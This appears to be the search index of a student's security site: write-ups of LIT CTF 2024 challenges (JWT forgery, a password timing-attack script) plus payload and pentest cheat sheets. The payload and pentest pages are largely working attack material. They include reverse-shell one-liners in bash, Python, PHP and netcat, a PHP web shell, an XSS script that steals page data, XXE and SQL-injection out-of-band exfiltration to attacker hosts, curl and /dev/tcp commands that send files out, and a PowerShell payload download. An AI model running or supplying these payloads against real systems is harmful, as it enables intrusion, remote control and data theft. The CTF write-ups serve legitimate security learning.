{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"About","text":"<p>I am majoring in cybersecurity at BYU. I'm particularly interested in pentesting and enjoy solving CTF problems.</p>"},{"location":"#experience","title":"Experience","text":"<p>Please visit my LinkedIn Profile</p>"},{"location":"#contact","title":"Contact","text":"<p>LinkedIn or jinook.kim@icloud.com</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-1/","title":"web/jwt-1","text":""},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-1/#about","title":"About","text":"<p>\"I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/ .\"</p> <p>Home Page: </p> <p>You can sign up to the website. </p> <p>However, when you click \"GET FLAG\", the webpage gives you \"Unauthorized\".</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-1/#recon","title":"Recon","text":"<p>As described in the introduction of the challenge, there is a JWT cookie after signing in. </p> <p>After doing some research, I came across the tool called JWT_Tool. If I put my cookie in, it gives me all the info. </p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-1/#exploitation","title":"Exploitation","text":"<p>It seems like I need to change that <code>admin</code> value to <code>True</code>. You can do that with the <code>-T</code> flag: <pre><code>python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGVzdDMzMyIsImFkbWluIjpmYWxzZX0.pexv7afakRnfXaUonh0o0Y96xPDz%2BSOsM453Mn%2F0YD -T\n</code></pre> </p> <p>Then, put the new cookie in the browser and hit \"GET FLAG\". </p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-2/","title":"web/jwt-2","text":""},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-2/#about","title":"About","text":"<p>\"its like jwt-1 but this one is harder URL: http://litctf.org:31777/ .\"</p> <p>The webpage looks exactly the same as <code>web/jwt-1</code>. This time, however, <code>index.ts</code> has been given: <pre><code>import express from \"express\";\nimport cookieParser from \"cookie-parser\";\nimport path from \"path\";\nimport fs from \"fs\";\nimport crypto from \"crypto\";\n\nconst accounts: [string, string][] = [];\n\nconst jwtSecret = \"xook\";\nconst jwtHeader = Buffer.from(\n  JSON.stringify({ alg: \"HS256\", typ: \"JWT\" }),\n  \"utf-8\"\n)\n  .toString(\"base64\")\n  .replace(/=/g, \"\");\n\nconst sign = (payload: object) =&gt; {\n  const jwtPayload = Buffer.from(JSON.stringify(payload), \"utf-8\")\n    .toString(\"base64\")\n    .replace(/=/g, \"\");\n    const signature = crypto.createHmac('sha256', jwtSecret).update(jwtHeader + '.' + jwtPayload).digest('base64').replace(/=/g, '');\n  return jwtHeader + \".\" + jwtPayload + \".\" + signature;\n\n}\n\nconst app = express();\n\nconst port = process.env.PORT || 3000;\n\napp.listen(port, () =&gt;\n  console.log(\"server up on http://localhost:\" + port.toString())\n);\n\napp.use(cookieParser());\napp.use(express.urlencoded({ extended: true }));\n\napp.use(express.static(path.join(__dirname, \"site\")));\n\napp.get(\"/flag\", (req, res) =&gt; {\n  if (!req.cookies.token) {\n    console.log('no auth')\n    return res.status(403).send(\"Unauthorized\");\n  }\n\n  try {\n    const token = req.cookies.token;\n    // split up token\n    const [header, payload, signature] = token.split(\".\");\n    if (!header || !payload || !signature) {\n      return res.status(403).send(\"Unauthorized\");\n    }\n    Buffer.from(header, \"base64\").toString();\n    // decode payload\n    const decodedPayload = Buffer.from(payload, \"base64\").toString();\n    // parse payload\n    const parsedPayload = JSON.parse(decodedPayload);\n        // verify signature\n        const expectedSignature = crypto.createHmac('sha256', jwtSecret).update(header + '.' + payload).digest('base64').replace(/=/g, '');\n        if (signature !== expectedSignature) {\n            return res.status(403).send('Unauthorized ;)');\n        }\n    // check if user is admin\n    if (parsedPayload.admin || !(\"name\" in parsedPayload)) {\n      return res.send(\n        fs.readFileSync(path.join(__dirname, \"flag.txt\"), \"utf-8\")\n      );\n    } else {\n      return res.status(403).send(\"Unauthorized\");\n    }\n  } catch {\n    return res.status(403).send(\"Unauthorized\");\n  }\n});\n\n.\n.\n.\n</code></pre></p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-2/#recon","title":"Recon","text":"<p>Looking at the code, I was able to figure out not only <code>admin</code> value needs to be <code>True</code>, but also <code>signature</code> part of the cookie needs to be constructed with <code>jwtSecret = \"xook\"</code> keyword.</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-jwt-2/#exploitation","title":"Exploitation","text":"<p>I wrote JavaScript code to craft the cookie. <pre><code>// cookie.js\nconst crypto = require('crypto');\n\nconst jwtHeader = Buffer.from(\n  JSON.stringify({ alg: \"HS256\", typ: \"JWT\" }),\n  \"utf-8\"\n)\n  .toString(\"base64\")\n  .replace(/=/g, \"\");\n\nconst jwtPayload = Buffer.from(JSON.stringify({ name: \"admin\", admin: true }), \"utf-8\")\n  .toString(\"base64\")\n  .replace(/=/g, \"\");\n\nconst jwtSecret = \"xook\";\nconst signature = crypto.createHmac('sha256', jwtSecret)\n  .update(jwtHeader + '.' + jwtPayload)\n  .digest('base64')\n  .replace(/=/g, '');\n\nconst token = `${jwtHeader}.${jwtPayload}.${signature}`;\n\nconsole.log(token);\n</code></pre></p> <pre><code>$ node cookie.js\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.MTnIgTB1oTbZ2pNsqQreiHQo9309/IoytyoVE4DshM8\n</code></pre> <p>Flag: LITCTF{v3rifyed_thI3_Tlme_1re4DV9}</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-kirbytime/","title":"web/kirbytime","text":""},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-kirbytime/#about","title":"About","text":"<p>\"Welcome to Kirby's Website.\" And there's a button that you can start the instance.</p> <p>The following files are given: </p> <p>main.py: <pre><code>import sqlite3\nfrom flask import Flask, request, redirect, render_template\nimport time\napp = Flask(__name__)\n\n\n@app.route('/', methods=['GET', 'POST'])\ndef login():\n    message = None\n    if request.method == 'POST':\n        password = request.form['password']\n        real = 'REDACTED'\n        if len(password) != 7:\n            return render_template('login.html', message=\"you need 7 chars\")\n        for i in range(len(password)):\n            if password[i] != real[i]:\n                message = \"incorrect\"\n                return render_template('login.html', message=message)\n            else:\n                time.sleep(1)\n        if password == real:\n            message = \"yayy! hi kirby\"\n\n    return render_template('login.html', message=message)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0')\n</code></pre></p> <p>login.html: <pre><code>.\n.\n.\n\n&lt;body&gt;\n    &lt;h1&gt;welcome back kirby :33&lt;/h1&gt;\n    &lt;p&gt;we will wait for u as u take ur time entering ur 7 character password&lt;/p&gt;\n\n    &lt;div class=\"container\"&gt;\n        &lt;img src=\"/static/kirby.png\" class=\"kirby-image\"&gt;\n        &lt;div class=\"form-container\"&gt;\n            &lt;form action=\"/\" method=\"POST\"&gt;\n                &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n                &lt;input type=\"password\" name=\"password\" id=\"password\"&gt;&lt;br&gt;\n                &lt;input type=\"submit\" value=\"Login\"&gt;\n            &lt;/form&gt;\n            {% if message %}\n                &lt;p&gt;{{ message }}&lt;/p&gt;\n            {% endif %}\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n</code></pre></p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-kirbytime/#recon","title":"Recon","text":"<p>It looks like we have to figure out that 7 digit password. Since the Python code checks the password one character by one and sleeps for 1 second if a character matches, we can exploit that behavior.</p>"},{"location":"CTF%20Writeup/LIT%20CTF%202024/web-kirbytime/#exploitation","title":"Exploitation","text":"<p>Given the above information, I wrote a Python script: <pre><code>import requests\nimport time\n\nurl = 'http://34.31.154.223:50017'\npassword = [' '] * 7\ncharset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\npassword_found = ''\n\ndef measure_response_time(password_attempt):\n    start_time = time.time()\n    response = requests.post(url, data={'password': password_attempt})\n    end_time = time.time()\n    return end_time - start_time\n\nfor i in range(7):\n    for char in charset:\n        temp_password = password\n        temp_password[i] = char\n        passowrd_attempt = ''.join(temp_password)\n        response_time = measure_response_time(passowrd_attempt)\n        if response_time &gt; (i+1):\n            password[i] = char\n            password_found += char\n            print('Password found: ' + password_found)\n            break\n</code></pre> </p> <p>Due to the 10-minute time limit of the instance, I had to run the following script to figure out the last character of the password. <pre><code>import requests\nimport time\n\nurl = 'http://34.31.154.223:51478'\npassword = ['k','B','y','S','l','a','?']\ncharset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\npassword_found = ''\n\ndef measure_response_time(password_attempt):\n    start_time = time.time()\n    response = requests.post(url, data={'password': password_attempt})\n    end_time = time.time()\n    return end_time - start_time\n\nfor char in charset:\n    temp_password = password\n    temp_password[6] = char\n    passowrd_attempt = ''.join(temp_password)\n    print(\"Trying: \" + passowrd_attempt)\n    response_time = measure_response_time(passowrd_attempt)\n    if response_time &gt; (6+1):\n        password[6] = char\n        password_found += char\n        print('Password found: ' + password_found)\n        break\n</code></pre></p> <p>Flag: LITCTF{kBySlaY}</p>"},{"location":"Payloads/BlindRCE/","title":"Blind RCE","text":"<p>Sends result as POST request: <pre><code>&lt;command&gt; | base64 | curl -d @- https://webhook.site/&lt;your_webhook_id&gt;\n</code></pre></p>"},{"location":"Payloads/SQLI/","title":"SQL Injection","text":""},{"location":"Payloads/SQLI/#out-of-band-injection","title":"Out-of-band Injection","text":""},{"location":"Payloads/SQLI/#mysql-and-mariadb","title":"MySQL and MariaDB","text":"<pre><code>SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';\n</code></pre>"},{"location":"Payloads/SQLI/#microsoft-sql-server-mssql","title":"Microsoft\u00a0SQL\u00a0Server (MSSQL)","text":"<pre><code>EXEC xp_cmdshell 'bcp \"SELECT sensitive_data FROM users\" queryout \"\\\\10.10.58.187\\logs\\out.txt\" -c -T';\n</code></pre>"},{"location":"Payloads/SQLI/#oracle","title":"Oracle","text":"<pre><code>DECLARE\n  req UTL_HTTP.REQ;\n  resp UTL_HTTP.RESP;\nBEGIN\n  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);\n  UTL_HTTP.GET_RESPONSE(req);\nEND;\n</code></pre>"},{"location":"Payloads/SSRF/","title":"SSRF","text":"<p>PHP File: <pre><code>&lt;?php header('location:file://'.$_REQUEST['x']); ?&gt;\n&lt;?php system($_GET[\"cmd\"]);?&gt;\n</code></pre></p> <p>Start Server: <pre><code>php -S 0.0.0.0:9001\n</code></pre></p> <p>Payload Example: <pre><code>&lt;iframe height=\"2000\" width=\"800\" src=\"http://&lt;yourip&gt;:9001/exfiltrate.php?x=/etc/passwd\"&gt;&lt;/iframe&gt;\n</code></pre></p>"},{"location":"Payloads/SSRF/#flask-example","title":"Flask Example","text":"<pre><code>from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return \"\"\"#!/bin/bash\nbash -c 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/9001 0&gt;&amp;1'\n\"\"\"\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8000)\n</code></pre>"},{"location":"Payloads/XSS/","title":"XSS","text":""},{"location":"Payloads/XSS/#xss-steal-file-content-payload","title":"XSS Steal File Content Payload","text":"<p><pre><code>// TrustedSec Proof-of-Concept to steal \n// sensitive data through XSS payload\n\n\nfunction read_body(xhr) \n{ \n    var data;\n\n    if (!xhr.responseType || xhr.responseType === \"text\") \n    {\n        data = xhr.responseText;\n    } \n    else if (xhr.responseType === \"document\") \n    {\n        data = xhr.responseXML;\n    } \n    else if (xhr.responseType === \"json\") \n    {\n        data = xhr.responseJSON;\n    } \n    else \n    {\n        data = xhr.response;\n    }\n    return data; \n}\n\n\n\n\nfunction stealData()\n{\n    var uri = \"/app/superSecretData.html\";\n\n    xhr = new XMLHttpRequest();\n    xhr.open(\"GET\", uri, true);\n    xhr.send(null);\n\n    xhr.onreadystatechange = function()\n    {\n        if (xhr.readyState == XMLHttpRequest.DONE)\n        {\n            // We have the response back with the data\n            var dataResponse = read_body(xhr);\n\n\n            // Time to exfiltrate the HTML response with the data\n            var exfilChunkSize = 2000;\n            var exfilData      = btoa(dataResponse);\n            var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);\n            var remainderBits  = exfilData.length % exfilChunkSize;\n\n            // Exfil the yummies\n            for (i = 0; i &lt; numFullChunks; i++)\n            {\n                console.log(\"Loop is: \" + i);\n\n                var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));\n\n                // Let's use an external image load to get our data out\n                // The file name we request will be the data we're exfiltrating\n                var downloadImage = new Image();\n                downloadImage.onload = function()\n                {\n                    image.src = this.src;\n                };\n\n                // Try to async load the image, whose name is the string of data\n                downloadImage.src = \"http://127.0.0.1/exfil/\" + i + \"/\" + exfilChunk + \".jpg\";\n            }\n\n            // Now grab that last bit\n            var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);\n            var downloadImage = new Image();\n            downloadImage.onload = function()\n            {\n                image.src = this.src;   \n            };\n\n            downloadImage.src = \"http://127.0.0.1/exfil/\" + \"LAST\" + \"/\" + exfilChunk + \".jpg\";\n            console.log(\"Done exfiling chunks..\");\n        }\n    }\n}\n\n\n\nstealData();\n</code></pre> Link to source</p> <p>XSS example: <pre><code>&lt;script src=http://10.13.60.191:9000/exfil.js&gt;&lt;/script&gt;\n</code></pre></p>"},{"location":"Payloads/XSS/#svg","title":"SVG","text":"<pre><code>&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;\n&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;\n&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n   &lt;rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /&gt;\n   &lt;script type=\"text/javascript\"&gt;\n      alert(document.domain);\n   &lt;/script&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"Payloads/XXE/","title":"XXE Injection","text":""},{"location":"Payloads/XXE/#in-band","title":"In-Band","text":"<pre><code>&lt;!DOCTYPE foo [\n    &lt;!ELEMENT foo ANY &gt;\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;\n]&gt;\n&lt;contact&gt;\n    &lt;name&gt;&amp;xxe;&lt;/name&gt;\n    &lt;email&gt;test@test.com&lt;/email&gt;\n    &lt;message&gt;test&lt;/message&gt;\n&lt;/contact&gt;\n</code></pre>"},{"location":"Payloads/XXE/#out-of-band","title":"Out-of-Band","text":"<p>Example: <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;upload&gt;\n  &lt;file&gt;\n    http://10.10.27.41/uploads/file_66981c1d9d7f81.07058312.txt\n  &lt;/file&gt;\n&lt;/upload&gt;\n</code></pre></p>"},{"location":"Payloads/XXE/#test-payload","title":"Test Payload","text":"<pre><code>&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"http://ATTACKER_IP:1337/\" &gt;]&gt;\n&lt;upload&gt;&lt;file&gt;&amp;xxe;&lt;/file&gt;&lt;/upload&gt;\n</code></pre>"},{"location":"Payloads/XXE/#sampledtd-in-attackers-machine-file-content","title":"<code>sample.dtd</code> (in attacker\u2019s machine) File Content","text":"<pre><code>&lt;!ENTITY % cmd SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % oobxxe \"&lt;!ENTITY exfil SYSTEM 'http://ATTACKER_IP:port/?data=%cmd;'&gt;\"&gt;\n%oobxxe;\n</code></pre>"},{"location":"Payloads/XXE/#payload","title":"Payload","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE upload SYSTEM \"http://ATTACKER_IP:port/sample.dtd\"&gt;\n&lt;upload&gt;\n  &lt;file&gt;&amp;exfil;&lt;/file&gt;\n&lt;/upload&gt;\n</code></pre>"},{"location":"Pentest/1-recon/","title":"Reconnaissance","text":""},{"location":"Pentest/1-recon/#nmap","title":"Nmap","text":""},{"location":"Pentest/1-recon/#initial-scan","title":"Initial scan","text":"<p><pre><code>nmap -sT -p- &lt;IP&gt; -T4\n</code></pre> <pre><code>nmap -sC -sV -sT -p &lt;ports&gt; &lt;IP&gt; -T4\n</code></pre> NMAP cheat sheet</p>"},{"location":"Pentest/1-recon/#vulnerability-scan","title":"Vulnerability Scan","text":""},{"location":"Pentest/1-recon/#basic","title":"Basic:","text":"<pre><code>nmap -Pn --script vuln &lt;IP&gt;\n</code></pre>"},{"location":"Pentest/1-recon/#more","title":"More:","text":"<ul> <li>Article</li> </ul>"},{"location":"Pentest/1-recon/#web-directory-discovery","title":"Web Directory Discovery","text":"<p><pre><code>gobuster dir -w &lt;wordlist.txt&gt; -u &lt;url&gt; -x &lt;file_extensions&gt;\n</code></pre> Gobuster Cheat Sheet</p>"},{"location":"Pentest/1-recon/#vhost-search","title":"Vhost Search","text":"<p><pre><code>ffuf -w &lt;wordlist&gt; -u &lt;url&gt; -H \"Host: FUZZ.example.com\"\n</code></pre> FFUF Cheat Sheet</p>"},{"location":"Pentest/2-resource_dev/","title":"Resource Development","text":""},{"location":"Pentest/2-resource_dev/#msfvenom","title":"MSFVenom","text":"<ul> <li>Reverse Shell Payload Cheatsheet</li> </ul>"},{"location":"Pentest/2-resource_dev/#path-traversal-wordlist","title":"Path Traversal Wordlist","text":"<p>LFI-Jhaddix.txt</p>"},{"location":"Pentest/2-resource_dev/#smb-enumeration","title":"SMB Enumeration","text":"<p>List shared folders: <pre><code>smbclient --no-pass -L //&lt;IP&gt;\n</code></pre></p> <p>Connect folder: <pre><code>smbclient --no-pass //&lt;IP&gt;/&lt;Folder&gt;\n</code></pre></p> <ul> <li>HackTricks SMB</li> </ul>"},{"location":"Pentest/3-initial_access/","title":"Initial Access","text":""},{"location":"Pentest/3-initial_access/#hydra","title":"Hydra","text":"<p>Post method example: <pre><code>hydra -l &lt;username&gt; -P &lt;password list&gt; &lt;target URL&gt; http-post-form \"/&lt;login URI&gt;:&lt;login form data&gt;:&lt;error message&gt;\"\n</code></pre></p> <ul> <li>Cheat Sheet</li> </ul>"},{"location":"Pentest/3-initial_access/#reverse-shell","title":"Reverse Shell","text":"<p><pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1\n\npython -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'\n\nphp -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'\n\nrm -f /tmp/a; mkfifo /tmp/a; nc 10.13.60.191 4444 0&lt;/tmp/a | /bin/sh &gt;/tmp/a 2&gt;&amp;1; rm /tmp/a \n</code></pre> * Cheat Sheet * PHP Reverse Shell</p> <p>Listener: <pre><code>nc -lvnp 4444\n</code></pre></p>"},{"location":"Pentest/3-initial_access/#shell-stabilization","title":"Shell Stabilization","text":""},{"location":"Pentest/3-initial_access/#option-1","title":"Option 1","text":"<pre><code>python -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre>"},{"location":"Pentest/3-initial_access/#option-2","title":"Option 2","text":"<p><code>ctrl + z</code> then <pre><code>stty raw -echo &amp;&amp; fg\n</code></pre></p>"},{"location":"Pentest/3-initial_access/#option-3","title":"Option 3","text":"<pre><code>rlwrap nc -lvnp 4444\n</code></pre>"},{"location":"Pentest/4-privilege_escalation/","title":"Privilege Escalation","text":""},{"location":"Pentest/4-privilege_escalation/#linux","title":"Linux","text":""},{"location":"Pentest/4-privilege_escalation/#linpeassh","title":"linpeas.sh","text":"<p>https://linpeas.sh/</p>"},{"location":"Pentest/4-privilege_escalation/#suid-and-sudo-exploit","title":"SUID and <code>sudo</code> Exploit","text":"<p>GTFOBins</p>"},{"location":"Pentest/4-privilege_escalation/#windows","title":"Windows","text":""},{"location":"Pentest/4-privilege_escalation/#winpeas","title":"winPEAS","text":"<p>Github link</p>"},{"location":"Pentest/4-privilege_escalation/#download-file-on-cmd","title":"Download File on cmd","text":"<pre><code>powershell \"(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')\"\n</code></pre>"},{"location":"Pentest/5-exfiltration/","title":"Exfiltration","text":""},{"location":"Pentest/5-exfiltration/#using-tcp-socket","title":"Using TCP Socket","text":"<p>Attacker listener: <pre><code>nc -lvp 8080 &gt; /tmp/exfil.data\n</code></pre></p> <p>From victim: <pre><code>tar zcf - folder/ | base64 | dd conv=ebcdic &gt; /dev/tcp/1.2.3.4/8080\n</code></pre></p> <p>Decrypt data: <pre><code>dd conv=ascii if=exfil.data | base64 -d &gt; exfil.tar\ntar xvf exfil.tar\n</code></pre></p>"},{"location":"Pentest/5-exfiltration/#using-ssh","title":"Using SSH","text":"<pre><code>tar cf - folder/ | ssh kali@1.2.3.4 \"cd /tmp/; tar xpf -\"\n</code></pre>"},{"location":"Pentest/5-exfiltration/#using-https","title":"Using HTTP(S)","text":"<p>From victim: <pre><code>curl --data \"file=$(tar zcf - folder | base64)\" http://&lt;attacker_ip&gt;/contact.php\n</code></pre></p> <p>contact.php: <pre><code>&lt;?php \nif (isset($_POST['file'])) {\n        $file = fopen(\"/tmp/http.bs64\",\"w\");\n        fwrite($file, $_POST['file']);\n        fclose($file);\n   }\n?&gt;\n</code></pre></p> <p>Decode file: <pre><code>sudo sed -i 's/ /+/g' /tmp/http.bs64\ncat /tmp/http.bs64 | base64 -d | tar xvfz -\n</code></pre></p>"},{"location":"Pentest/5-exfiltration/#http-tunneling","title":"HTTP Tunneling","text":"<p>When you can upload file to the web server, using Neo-reGeorg.</p> <ol> <li>Generate encrypted Tunneling clients with <code>key</code> key in the <code>neoreg_servers/</code> directory.</li> </ol> <pre><code>python3 neoreg.py generate -k key\n</code></pre> <ol> <li>Upload file</li> <li>Create tunnel</li> </ol> <pre><code>python3 neoreg.py -k key -u &lt;URL to uploaded file&gt;\n</code></pre> <ol> <li>Access</li> </ol>"}]}